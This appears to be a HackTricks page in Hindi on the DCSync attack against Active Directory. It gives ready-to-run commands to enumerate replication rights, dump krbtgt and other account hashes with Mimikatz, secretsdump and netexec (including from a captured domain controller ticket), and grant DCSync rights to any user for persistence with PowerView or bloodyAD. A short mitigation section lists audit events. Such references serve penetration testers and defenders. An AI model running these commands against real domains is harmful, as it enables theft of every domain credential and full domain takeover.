# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** permission का अर्थ है कि domain पर ये permissions प्राप्त हैं: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** और **Replicating Directory Changes In Filtered Set**।<sup>[[3]](#references)</sup>

**DCSync के बारे में महत्वपूर्ण नोट्स:**

- **DCSync attack एक Domain Controller के व्यवहार का अनुकरण करता है और Directory Replication Service Remote Protocol (MS-DRSR) का उपयोग करके अन्य Domain Controllers से information replicate करने के लिए कहता है।** क्योंकि MS-DRSR Active Directory का एक valid और आवश्यक function है, इसलिए इसे बंद या disable नहीं किया जा सकता।
- डिफ़ॉल्ट रूप से केवल **Domain Admins, Enterprise Admins, Administrators, और Domain Controllers** groups के पास आवश्यक privileges होते हैं।
- व्यवहार में, **full DCSync** के लिए domain naming context पर **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** आवश्यक हैं। `DS-Replication-Get-Changes-In-Filtered-Set` को आमतौर पर इनके साथ delegate किया जाता है, लेकिन अकेले यह full krbtgt dump की तुलना में **confidential / RODC-filtered attributes** (उदाहरण के लिए legacy LAPS-style secrets) को sync करने के लिए अधिक relevant है।<sup>[[2]](#references)</sup>
- यदि किसी account के passwords reversible encryption के साथ stored हैं, तो Mimikatz में password को clear text में return करने का option उपलब्ध है।

### Enumeration

`powerview` का उपयोग करके check करें कि इन permissions के पास किसका access है:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
यदि आप **non-default principals** के पास मौजूद DCSync rights पर focus करना चाहते हैं, तो built-in replication-capable groups को filter out करें और केवल unexpected trustees की review करें:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Locally Exploit
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### दूरस्थ रूप से Exploit करें
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
व्यावहारिक सीमित-दायरे वाले उदाहरण:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### Captured DC machine TGT (ccache) का उपयोग करके DCSync

unconstrained-delegation export-mode scenarios में, आप Domain Controller machine TGT (उदाहरण के लिए, `DC1$@DOMAIN` से `krbtgt@DOMAIN` के लिए) capture कर सकते हैं। इसके बाद आप उस ccache का उपयोग करके DC के रूप में authenticate कर सकते हैं और password के बिना DCSync कर सकते हैं।<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Operational notes:

- **Impacket's Kerberos path पहले SMB को touch करता है** और उसके बाद DRSUAPI call करता है। यदि environment **SPN target name validation** लागू करता है, तो full dump विफल हो सकता है और यह संदेश दिखाई दे सकता है: `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- ऐसी स्थिति में, पहले target DC के लिए **`cifs/<dc>`** service ticket request करें या तुरंत आवश्यक account के लिए **`-just-dc-user`** का उपयोग करें।
- जब आपके पास केवल lower replication rights हों, तब भी LDAP/DirSync-style syncing **confidential** या **RODC-filtered** attributes (उदाहरण के लिए legacy `ms-Mcs-AdmPwd`) को full krbtgt replication के बिना expose कर सकती है।<sup>[[2]](#references)</sup>

`-just-dc` 3 files generate करता है:

- एक file जिसमें **NTLM hashes** होते हैं
- एक file जिसमें **Kerberos keys** होती हैं
- एक file जिसमें NTDS से उन सभी accounts के cleartext passwords होते हैं जिनके लिए [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled है। आप reversible encryption वाले users को इस command से प्राप्त कर सकते हैं:

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

यदि आप domain admin हैं, तो PowerView की सहायता से ये permissions किसी भी user को grant कर सकते हैं:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linux ऑपरेटर `bloodyAD` के साथ यही कर सकते हैं:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
फिर, आप **जांच सकते हैं कि user को 3 privileges सही तरीके से assign किए गए थे या नहीं**, इसके लिए उन्हें निम्न के output में खोजें (आपको "ObjectType" field के अंदर privileges के नाम दिखाई देने चाहिए):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (object के लिए Audit Policy enabled होना आवश्यक है) – किसी object पर operation किया गया<sup>[[4]](#references)</sup>
- Security Event ID 5136 (object के लिए Audit Policy enabled होना आवश्यक है) – किसी directory service object को modify किया गया
- Security Event ID 4670 (object के लिए Audit Policy enabled होना आवश्यक है) – किसी object की permissions बदली गईं
- AD ACL Scanner - ACLs की reports बनाएँ और उनकी तुलना करें। [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Replication Get-Changes और Get-Changes-In-Filtered-Set का लाभ उठाना](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Domain Controller से Password Hashes Dump करना](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
